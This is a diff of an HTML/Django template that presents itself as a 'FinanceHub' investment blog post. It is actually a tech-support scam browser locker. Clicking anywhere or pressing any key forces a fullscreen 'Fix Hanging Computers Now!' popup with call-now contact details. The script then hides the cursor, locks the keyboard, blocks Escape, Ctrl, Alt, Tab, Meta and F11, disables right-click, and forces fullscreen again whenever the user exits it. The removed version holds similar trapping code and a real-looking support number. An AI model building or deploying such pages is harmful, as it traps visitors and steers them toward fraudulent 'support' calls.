@@ -1,305 +1,608 @@
 <!DOCTYPE html>
 <html lang="en">
+  {% load static %}
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Permissions-Policy" content="fullscreen=(self)">
-    <title>Basic Fullscreen Website</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background-color: #f4f4f4;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Permissions-Policy" content="fullscreen=(self)">
+  <title>Blog Detail | FinanceHub</title>
+  <link rel="stylesheet" href="{% static 'css/style.css' %}">
+  <style>
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+        html, body {
+  margin: 0;
+  padding: 0;
+  overflow-x: hidden; /* ✅ Hides horizontal scrollbar */
+  width: 100%;
+}
 
-        h1 {
-            color: #333;
-        }
+ .no-scroll {
+      overflow: hidden;
+      height: 100%; /* Ensures the body takes full height and overflow applies correctly */
+    }
+ 
 
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            /* cursor: pointer; */
-            border-radius: 5px;
-        }
+    .logo {
+      font-size: 1.8rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-decoration: none;
+      transition: transform 0.3s ease;
+    }
 
-        button:hover {
-            background-color: #0056b3;
-        }
+    .logo:hover {
+      transform: scale(1.05);
+    }
 
-        .popup-overlay {
-            display: none; /* Hidden by default */
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-        }
 
-        .popup {
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-        }
+    .container {
+      max-width: 1100px;
+      margin: 60px auto;
+      background: #fff;
+      border-radius: 24px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+      animation: fadeInUp 0.8s ease;
+    }
 
-        .close-btn {
-            background-color: red;
-            color: white;
-            border: none;
-            font-size: 20px;
-            float: right;
-            /* cursor: pointer; */
-        }
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
 
-        .contact-btn {
-            padding: 10px 20px;
-            background-color: green;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-        }
-        :fullscreen {
-            --system-ui-visibility: none;
-            display: var(--system-ui-visibility);
-        }
-        .hide-cursor, .hide-cursor * {
-            cursor: none !important;
-        }
-        /* html * {cursor:none}
-        html * {cursor:none!important}
-        * {
-            cursor: none !important;
-        }
-        html {
-            cursor: none !important;
-        }
-        * { cursor: url(cursor.png), none !important }
-        .cursor{
-            position:absolute;
-            top:0;
-            bottom:0;
-            left:0;
-            right:0;
-            cursor: url(http://davidwalsh.name/demo/css-custom-cursor.ico), default;
-        } */
+    .blog-image-wrapper {
+      position: relative;
+      width: 100%;
+      height: 500px;
+      overflow: hidden;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
 
-    </style>
+    .blog-image-wrapper img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transition: transform 0.6s ease;
+      opacity: 0.95;
+    }
+
+    .blog-image-wrapper:hover img {
+      transform: scale(1.08);
+    }
+
+    .image-overlay {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 150px;
+      background: linear-gradient(to top, rgba(0,0,0,0.7), transparent);
+    }
+
+    .content-section {
+      padding: 50px 60px 60px;
+      position: relative;
+    }
+
+    .blog-header {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      margin-bottom: 25px;
+      animation: slideInLeft 0.8s ease 0.2s backwards;
+    }
+
+    @keyframes slideInLeft {
+      from {
+        opacity: 0;
+        transform: translateX(-30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
+    .icon-wrapper {
+      font-size: 3.5rem;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      padding: 15px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+      animation: pulse 2s ease infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .blog-title {
+      font-size: 2.8rem;
+      font-weight: 800;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      line-height: 1.2;
+    }
+
+    .blog-date {
+      color: #888;
+      font-size: 1rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .blog-date::before {
+      content: '📅';
+      font-size: 1.2rem;
+    }
+
+    .blog-content {
+      font-size: 1.15rem;
+      margin: 35px 0;
+      color: #555;
+      line-height: 1.9;
+      animation: slideInLeft 0.8s ease 0.4s backwards;
+      background: linear-gradient(to right, #f8f9fa, transparent);
+      padding: 30px;
+      border-left: 5px solid #667eea;
+      border-radius: 8px;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 20px;
+      align-items: center;
+      margin-top: 40px;
+      animation: slideInLeft 0.8s ease 0.6s backwards;
+      flex-wrap: wrap;
+    }
+
+    .read-more {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 16px 32px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: #fff;
+      text-decoration: none;
+      border-radius: 50px;
+      font-weight: 600;
+      transition: all 0.4s ease;
+      box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .read-more::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.2);
+      transition: left 0.5s ease;
+    }
+
+    .read-more:hover::before {
+      left: 100%;
+    }
+
+    .read-more:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 30px rgba(102, 126, 234, 0.5);
+    }
+
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: #667eea;
+      text-decoration: none;
+      font-weight: 600;
+      padding: 12px 24px;
+      border: 2px solid #667eea;
+      border-radius: 50px;
+      transition: all 0.3s ease;
+    }
+
+    .back-link:hover {
+      background: #667eea;
+      color: #fff;
+      transform: translateX(-5px);
+    }
+
+    .decorative-element {
+      position: absolute;
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      opacity: 0.05;
+      z-index: -1;
+    }
+
+    .element-1 {
+      top: -100px;
+      right: -100px;
+    }
+
+    .element-2 {
+      bottom: -100px;
+      left: -100px;
+    }
+
+    /* Fullscreen Overlay Styles */
+    .fullscreen-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background:transparent;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      font-size: 24px;
+      text-align: center;
+      z-index: 9999;
+      cursor: pointer;
+    }
+
+    .fullscreen-overlay h2 {
+      font-size: 36px;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+    }
+
+    .fullscreen-overlay p {
+      font-size: 18px;
+      margin-bottom: 30px;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+    }
+
+    .click-instruction {
+      background: rgba(3, 95, 6, 0.727);
+      color: rgb(255, 251, 251);
+      padding: 15px 30px;
+      border-radius: 50px;
+      border: 2px solid white;
+      font-weight: bold;
+      animation: pulse 2s infinite;
+    }
+
+    .hide-cursor, .hide-cursor * {
+      cursor: none !important;
+    }
+
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+    }
+
+    .popup-content {
+      background-color: white;
+      padding: 40px;
+      border-radius: 15px;
+      text-align: center;
+      max-width: 500px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    }
+
+    .popup-content h3 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+
+    .popup-content p {
+      color: #666;
+      margin-bottom: 15px;
+      line-height: 1.6;
+    }
+
+    .contact-info {
+      background: #f8f9fa;
+      padding: 20px;
+      border-radius: 10px;
+      margin: 20px 0;
+    }
+
+    .contact-btn {
+      display: inline-block;
+      padding: 12px 30px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      text-decoration: none;
+      border-radius: 25px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+
+    .contact-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+    }
+
+    @media (max-width: 768px) {
+      .nav-container {
+        flex-direction: column;
+        gap: 20px;
+        padding: 20px;
+      }
+
+      .nav-links {
+        gap: 20px;
+      }
+
+      .container {
+        margin: 30px 20px;
+        border-radius: 16px;
+      }
+
+      .blog-image-wrapper {
+        height: 300px;
+      }
+
+      .content-section {
+        padding: 30px 25px;
+      }
+
+      .blog-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .blog-title {
+        font-size: 2rem;
+      }
+
+      .blog-content {
+        font-size: 1rem;
+        padding: 20px;
+      }
+
+      .button-group {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .read-more,
+      .back-link {
+        justify-content: center;
+        text-align: center;
+      }
+
+      .fullscreen-overlay h2 {
+        font-size: 28px;
+      }
+
+      .fullscreen-overlay p {
+        font-size: 16px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="cursor"></div>
-    <h1>Welcome to My Basic Website</h1>
-    <p>This is a simple example website with a fullscreen feature.</p>
+  <!-- Fullscreen Overlay - covers entire page -->
+  <div class="fullscreen-overlay" id="fullscreenOverlay">
+  
+    <div class="click-instruction">Click Here to Read Full Blog </div>
+  </div>
 
-    <button id="fullscreenBtn">View Site in Full Screen</button>
-    <button id="viewContentBtn">View Content in Full Screen</button>
-
-    <button id="lockKeyboardBtn">Lock Keyboard</button>
-    <p class="status" id="statusText">Keyboard is unlocked.</p>
-
-    <div class="popup-overlay" id="firstPopupOverlay">
-        <div class="popup" id="firstPopup">
-            <!-- <button class="close-btn" id="firstCloseBtn">&times;</button> -->
-            <h2>Fix Hanging Computers Now!</h2>
-            <p>Is your computer slow or freezing? Don't worry! Our expert tech support is here to help you instantly.</p>
-            <p>📞 Call Now: <strong>+91-97113 47474</strong></p>
-            <p>📧 Email: <strong>info@itsolution4india.com</strong></p>
-            <p>🌐 Visit: <a href="https://www.itsolutions4india.com" target="_blank">www.itsolutions4india.com</a></p>
-            <a href="tel:+919711347474" class="contact-btn">Get Instant Help</a>
-        </div>
+  <!-- Popup Overlay -->
+  <div class="popup-overlay" id="popupOverlay">
+    <div class="popup-content">
+      <h3>Fix Hanging Computers Now!</h3>
+      <p>Is your computer slow or freezing? Don't worry! Our expert tech support is here to help you instantly.</p>
+      <div class="contact-info">
+        <p>📞 Call Now: <strong>+91-1234567890</strong></p>
+        <p>📧 Email: <strong>support@financehubhere.online</strong></p>
+        <p>🌐 Visit: <strong>www.financehubhere.online</strong></p>
+      </div>
+      <a href="tel:+919711347474" class="contact-btn">Get Instant Help</a>
     </div>
-<!-- Include jQuery -->
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  </div>
 
-    <script>
-        const fullscreenBtn = document.getElementById('fullscreenBtn');
-        const viewContentBtn = document.getElementById('viewContentBtn');
-        const firstPopupOverlay = document.getElementById('firstPopupOverlay');
-        const firstCloseBtn = document.getElementById('firstCloseBtn');
+  <!-- Main Content -->
+  <nav>
+    <div class="nav-container">
+      <a href="/" class="logo">FinanceHub</a>
+      <ul class="nav-links">
+        <li><a href="/">Home</a></li>
+        <li><a href="#about">About</a></li>
+        <li><a href="#blogs" class="active">Blogs</a></li>
+        <li><a href="#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
 
-        function toggleFullscreen() {
-            if (!document.fullscreenElement) {
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                } else if (document.documentElement.mozRequestFullScreen) {
-                    document.documentElement.mozRequestFullScreen();
-                } else if (document.documentElement.webkitRequestFullscreen) {
-                    document.documentElement.webkitRequestFullscreen();
-                } else if (document.documentElement.msRequestFullscreen) {
-                    document.documentElement.msRequestFullscreen();
-                }
-            } else {
-                if (document.exitFullscreen) {
-                    document.exitFullscreen();
-                }
-            }
-        }
+  <div class="container">
+    <div class="decorative-element element-1"></div>
+    <div class="decorative-element element-2"></div>
+    
+    <div class="blog-image-wrapper">
+      <img src="{% static 'images/8.png' %}" alt="Investment Strategy">
+      <div class="image-overlay"></div>
+    </div>
 
-        function toggleContentFullscreen() {
-            firstPopupOverlay.style.display = "flex";
+    <div class="content-section">
+      <div class="blog-header">
+        <div class="icon-wrapper">💰</div>
+        <div>
+          <div class="blog-title">Smart Investment Strategies for 2025</div>
+          <div class="blog-date">October 30, 2025</div>
+        </div>
+      </div>
 
-            if (!document.fullscreenElement) {
-                if (firstPopupOverlay.requestFullscreen) {
-                    firstPopupOverlay.requestFullscreen();
-                } else if (firstPopupOverlay.mozRequestFullScreen) {
-                    firstPopupOverlay.mozRequestFullScreen();
-                } else if (firstPopupOverlay.webkitRequestFullscreen) {
-                    firstPopupOverlay.webkitRequestFullscreen();
-                } else if (firstPopupOverlay.msRequestFullscreen) {
-                    firstPopupOverlay.msRequestFullscreen();
-                }
-            } else {
-                if (document.exitFullscreen) {
-                    document.exitFullscreen();
-                }
-            }
-        }
+      <div class="blog-content">
+        Estate planning is the process of organizing your affairs so that your wealth, property, and personal decisions are clearly defined and legally binding. It involves creating documents like wills, trusts, and power of attorney, ensuring that your estate doesn't get caught up in lengthy legal battles or excessive taxes.
+      </div>
 
-        fullscreenBtn.addEventListener('click', toggleFullscreen);
-        viewContentBtn.addEventListener('click', toggleContentFullscreen);
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                viewContentBtn.click();
-            }, 5000);
-        });
-        firstCloseBtn.addEventListener('click', () => {
-            firstPopupOverlay.style.display = "none";
-            if (document.exitFullscreen) {
-                document.exitFullscreen();
-            }
-        });
-        
-    </script>
-<script>
-    setTimeout(function() {
-        document.body.style.cursor = 'none';
-    }, 5100);
-</script>
-<script>
-    // Apply class after 5.1 seconds
-    setTimeout(function() {
+      <div class="button-group">
+        <a href="#read-more" class="read-more">
+          Read Full Article
+          <span>→</span>
+        </a>
+        <a href="#blogs" class="back-link">
+          <span>←</span>
+          Back to Blogs
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const fullscreenOverlay = document.getElementById('fullscreenOverlay');
+    const popupOverlay = document.getElementById('popupOverlay');
+
+    // Function to enter fullscreen and activate everything
+    function enterFullscreenMode() {
+      // Hide the fullscreen overlay
+      fullscreenOverlay.style.display = 'none';
+      
+      // Show the popup immediately
+      popupOverlay.style.display = "flex";
+      
+      // Enter fullscreen mode
+      if (popupOverlay.requestFullscreen) {
+        popupOverlay.requestFullscreen();
+      } else if (popupOverlay.mozRequestFullScreen) {
+        popupOverlay.mozRequestFullScreen();
+      } else if (popupOverlay.webkitRequestFullscreen) {
+        popupOverlay.webkitRequestFullscreen();
+      } else if (popupOverlay.msRequestFullscreen) {
+        popupOverlay.msRequestFullscreen();
+      }
+      
+      // Hide cursor after short delay
+      setTimeout(function() {
         document.body.classList.add('hide-cursor');
-    }, 5100);
-</script>
-</body>
-<script>
-        // Disable right-click context menu
-        document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-    });
+      }, 1000);
+      
+      // Lock keyboard functionality
+      lockKeyboard();
+    }
 
-    // Disable left, right, and middle mouse clicks
-    document.addEventListener('mousedown', function(e) {
-        e.preventDefault(); // Prevent all mouse button actions
-    });
-</script>
-<script>
+    // Add click event to entire overlay
+    fullscreenOverlay.addEventListener('click', enterFullscreenMode);
+
+    // Also allow any key press to trigger
     document.addEventListener('keydown', function(e) {
-        console.log("Key", e.key); // Debugging output to see which key is pressed
-
-        // Disable the Escape key
-        if (e.key === 'Escape' || e.keyCode === 27) {
-            e.preventDefault();
-        }
-
-        // Disable the Ctrl key and any combinations involving it
-        if (e.key === 'Control' || e.ctrlKey) {
-            e.preventDefault();
-        }
-
-        // Disable the Meta (Windows) key
-        if (e.key === 'Meta') {
-            e.preventDefault();
-        }
-
-        // Disable the Alt key
-        if (e.key === 'Alt') {
-            e.preventDefault();
-        }
-
-        // Disable the Tab key
-        if (e.key === 'Tab') {
-            e.preventDefault();
-        }
+      if (fullscreenOverlay.style.display !== 'none') {
+        enterFullscreenMode();
+      }
     });
-</script>
-<script>
-       $(document).ready(function () {
-      $(document).keydown(function (event) {
-        var charCode = event.charCode || event.keyCode || event.which;
-        if (charCode == 27 || charCode == 91 || charCode == 92) {
-          event.preventDefault();
-        }
-      });
-    });
-</script>
-<script>
-    dialog.addEventListener('cancel', (event) => {
-    event.preventDefault();
-});
-</script>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-<script>
-    $(document).on("keydown",function(ev){
-	console.log(ev.keyCode);
-	if(ev.keyCode===27||ev.keyCode===122) return false
-})
-</script>
-<script>
-    const lockKeyboardBtn = document.getElementById('lockKeyboardBtn');
-    const statusText = document.getElementById('statusText');
 
     // Function to lock the keyboard
     function lockKeyboard() {
-        if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
-            // Attempt to lock all keys except 'Esc'
-            navigator.keyboard.lock().then(() => {
-                statusText.textContent = "Keyboard is locked.";
-            }).catch((error) => {
-                statusText.textContent = "Failed to lock the keyboard.";
-                console.error('Error locking keyboard:', error);
-            });
-        } else {
-            statusText.textContent = "Keyboard lock is not supported in this browser.";
-            console.warn('Keyboard lock not supported in this browser.');
-        }
+      if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+        navigator.keyboard.lock().then(() => {
+          console.log("Keyboard locked successfully");
+        }).catch((error) => {
+          console.error('Error locking keyboard:', error);
+        });
+      } else {
+        console.warn('Keyboard lock not supported in this browser.');
+      }
     }
 
-    // Add click event listener to the button
-    lockKeyboardBtn.addEventListener('click', lockKeyboard);
-</script>
-<script>
-    document.documentElement.style.setProperty('--system-ui-visibility', 'none');
-</script>
-<script>
-    const { app, globalShortcut } = require('electron');
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
 
-app.whenReady().then(() => {
-  globalShortcut.register('Ctrl+Alt+Delete', () => {
-    console.log('Blocked Ctrl+Alt+Delete'); // Won't actually block this in Windows
-  });
+    // Disable various keyboard keys
+    document.addEventListener('keydown', function(e) {
+      // Disable the Escape key
+      if (e.key === 'Escape' || e.keyCode === 27) {
+        e.preventDefault();
+      }
 
-  // Example to block Alt+F4
-  globalShortcut.register('Alt+F4', () => {
-    console.log('Blocked Alt+F4');
-  });
-});
+      // Disable the Ctrl key and any combinations involving it
+      if (e.key === 'Control' || e.ctrlKey) {
+        e.preventDefault();
+      }
 
-</script>
-<!-- <script type="text/javascript">
-    document.body.style.cursor = 'none';
-    $('html,body').css('cursor','none');
-</script> -->
-</html>
+      // Disable the Meta (Windows) key
+      if (e.key === 'Meta') {
+        e.preventDefault();
+      }
+
+      // Disable the Alt key
+      if (e.key === 'Alt') {
+        e.preventDefault();
+      }
+
+      // Disable the Tab key
+      if (e.key === 'Tab') {
+        e.preventDefault();
+      }
+
+      // Disable F11 key
+      if (e.key === 'F11' || e.keyCode === 122) {
+        e.preventDefault();
+      }
+    });
+
+    // Additional key blocking for extra security
+    document.addEventListener('keydown', function(event) {
+      var charCode = event.charCode || event.keyCode || event.which;
+      if (charCode == 27 || charCode == 91 || charCode == 92 || charCode == 122) {
+        event.preventDefault();
+        return false;
+      }
+    });
+
+    // Handle fullscreen change events
+    document.addEventListener('fullscreenchange', function() {
+      if (!document.fullscreenElement) {
+        // If user somehow exits fullscreen, try to re-enter
+        if (popupOverlay.style.display === 'flex') {
+          popupOverlay.requestFullscreen().catch(err => {
+            console.log('Error re-entering fullscreen:', err);
+          });
+        }
+      }
+    });
+  </script>
+  
+</body>
+</html> 
